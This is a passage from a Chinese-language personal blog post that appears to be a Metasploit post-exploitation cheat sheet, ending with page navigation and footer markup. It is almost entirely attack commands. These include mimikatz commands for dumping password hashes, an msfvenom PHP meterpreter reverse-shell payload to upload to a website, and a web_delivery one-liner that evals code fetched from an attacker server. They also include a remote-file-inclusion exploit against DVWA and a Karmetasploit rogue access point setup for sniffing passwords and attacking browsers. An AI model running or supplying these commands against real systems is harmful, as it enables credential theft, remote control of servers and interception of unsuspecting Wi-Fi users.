mimikatz_command -h</span><br><span class="line">        mimikatz_command -f a::</span><br><span class="line">        mimikatz_command -f samdump::hashes</span><br><span class="line">        mimikatz_command -f handle::list</span><br><span class="line">        mimikatz_command -f service::list</span><br><span class="line">        mimikatz_command -f crypto::listProviders</span><br><span class="line">        mimikatz_command -f winmine::infos # 扫雷游戏</span><br><span class="line"></span><br><span class="line">代码执行漏洞</span><br><span class="line"></span><br><span class="line">    PHP shell</span><br><span class="line">        msfvenom -p php/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=3333 -f raw -o a.php</span><br><span class="line">        msf 启动侦听</span><br><span class="line">        上传到web站点并通过浏览器访问</span><br><span class="line"></span><br><span class="line">    web Delivery</span><br><span class="line">        利用代码执行漏洞访问攻击者服务器</span><br><span class="line">        use exploit/multi/script/web_delivery</span><br><span class="line">        set target 1</span><br><span class="line">        run</span><br><span class="line">        :</span><br><span class="line">        php -d allow_url_fopen=true -r “eval(file_get_contents(‘http://1.1.1.1/fTYWqmu‘));”</span><br><span class="line"></span><br><span class="line">RFI 远程文件包含</span><br><span class="line"></span><br><span class="line">    vi /etc/php5/cgi/php.ini</span><br><span class="line">        allow_url_fopen = On</span><br><span class="line">        allow_url_include = On</span><br><span class="line">    use exploit/unix/webapp/php_include</span><br><span class="line">    set RHOST 1.1.1.2</span><br><span class="line">    set PATH /dvwa/vulnerabilities/fi/</span><br><span class="line">    set PHPURI /?page=XXpathXX</span><br><span class="line">    set HEADERS “Cookie:security=low;PHPSESSID=eefcf023ba61219d4745ad7487fe81d7”</span><br><span class="line">    set payload php/meterpreter/reverse_tcp</span><br><span class="line">    set lhost 1.1.1.1</span><br><span class="line">    exploit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Karmetasploit</span><br><span class="line">    伪造 AP、嗅探密码、接货数据、浏览器攻击</span><br><span class="line"></span><br><span class="line">    多漏洞资源文件：wget https://www.offensive-security.com/wp-content/uploads/2015/04/karma.rc_.txt</span><br><span class="line"></span><br><span class="line">    安装其他依赖包</span><br><span class="line">        gem install activerecord sqlite3-ruby</span><br><span class="line"></span><br><span class="line">    基础架构安装配置</span><br><span class="line">        apt-get install isc-dhcp-server</span><br><span class="line">        cat /etc/dhcp/dhcpd.conf</span><br><span class="line">        option domain-name-servers 10.0.0.1; default-lease-time 60;</span><br><span class="line">        max-lease-time 72;</span><br><span class="line">        ddns-update-style none;</span><br><span class="line">        authoritative;</span><br><span class="line">        log-facility local7;</span><br><span class="line">        subnet 10.0.0.0 netmask 255.255.255.0 &#123;</span><br><span class="line">        range 10.0.0.100 10.0.0.254;</span><br><span class="line">        option routers 10.0.0.1;</span><br><span class="line">        option domain-name-servers 10.0.0.1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">伪造 AP</span><br><span class="line">        airmon-ng start wlan0</span><br><span class="line">        airbase-ng -P -C 30 -e “FREE” -v wlan0mon</span><br><span class="line">        ifconfig at0 up 10.0.0.1 netmask 255.255.255.0</span><br><span class="line">        touch /var/lib/dhcp/dhcpd.leases</span><br><span class="line">        dhcpd -cf /etc/dhcp/dhcpd.conf at0</span><br><span class="line"></span><br><span class="line">启动 Karmetasploit</span><br><span class="line">        msfconsole -q -r karma.rc_.txt</span><br><span class="line"></span><br><span class="line">允许用户正常上网</span><br><span class="line"></span><br><span class="line">        vi karma.rc_.txt</span><br><span class="line"></span><br><span class="line">        文件链接：https://pan.baidu.com/s/1ShLYDGaoIo9M-ihU0iN8Eg 密码：tpc0</span><br><span class="line"></span><br><span class="line">        删除 setg 参数</span><br><span class="line">        增加 browser_autopwn2 等其他模块</span><br><span class="line">        检查恶意流量：auxiliary/vsploit/malware/dns*</span><br><span class="line"></span><br><span class="line">启动 Karmetasploit</span><br><span class="line">        msfconsole -q -r /root/karma.rc_.txt</span><br><span class="line"></span><br><span class="line">增加路由和防火墙规则</span><br><span class="line">        echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br><span class="line">        iptables -P FORWARD ACCEPT</span><br><span class="line">        iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</span><br></pre></td></tr></table></figure>

  </article>
  <aside class="table-content" id="site-toc">
  <div class="table-content-title">
    <i class="fa fa-arrow-right fa-lg" id="site-toc-hide-btn"></i>
    <span>目录</span>
  </div>
  <div class="table-content-main">
    
  </div>
</aside>
  
    <aside class="passage-copyright">
      <div>本文作者: hcncn</div>
      
        <div>
          原文链接: 
          <a href="" target="_blank">https://hcncn6.github.io/2019/01/01/Meterpreter/Mestasploit 后渗透/</a>
        </div>
      
      <div>
        版权声明: 本博客所有文章除特别声明外, 均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议. 转载请注明出处!
      </div>
    </aside>
  
  
</div>

    </main>
    
    <div class="site-footer-wrapper">
  <footer class="site-footer">
    
    <div class="site-footer-info">
      <i class="fa fa-clock-o"></i> 本站已稳定运行<span id="site-time"></span>
    </div>
    
    
    <div class="site-footer-info">
      <i class="fa fa-copyright"></i> 
      2019 <a href="https://github.com/dongyuanxin/theme-ad/" target="_blank">Theme-AD</a>.
      Created by <a href="https://godbmw.com/" target="_blank">GodBMW</a>.
      All rights reserved.
    </div>
  </footer>
</div>
    <div id="site-layer" style="display:none;">
  <div class="site-layer-content">
    <div class="site-layer-header">
      <span class="site-layer-header-title" id="site-layer-title"></span>
      <i class="fa fa-close" id="site-layer-close"></i>
    </div>
    <div class="site-layer-body" id="site-layer-container">
      <div class="site-layer-input" id="site-layer-search" style="display: none;">
        <div class="site-layer-input-choose">
          <a href="javascript:void(0);" title="Change Search Engine">Google</a>
        </div>
        <input type="text">
        <i class="fa fa-search"></i>
      </div>
      
      <div id="site-layer-welcome" style="display:none;"></div>
    </div>
  </div>
</div>
    

<div class="bottom-bar">
  <div class="bottom-bar-left">
    <a href="/2019/01/01/web/xss/" data-enable="true">
      <i class="fa fa-arrow-left"></i>
    </a>
    <a href="/2019/01/01/内网/cmd命令/" data-enable="true">
      <i class="fa fa-arrow-right"></i>
    </a>
  </div>
  <div class="bottom-bar-right">
    <a href="javascript:void(0);" data-enable="true" id="site-toc-show-btn">
      <i class="fa fa-bars"></i>
    </a>
    
    <a href="javascript:void(0);" id="site-toggle-share-btn">
      <i class="fa fa-share-alt"></i>
    </a>
    
    <a href="javascript:void(0);" id="back-top-btn">
      <i class="fa fa-chevron-up"></i>
    </a>
  </div>
</div>
    <div id="share-btn">
  
  
  
  
  
</div>
    





    
  </body>
</html>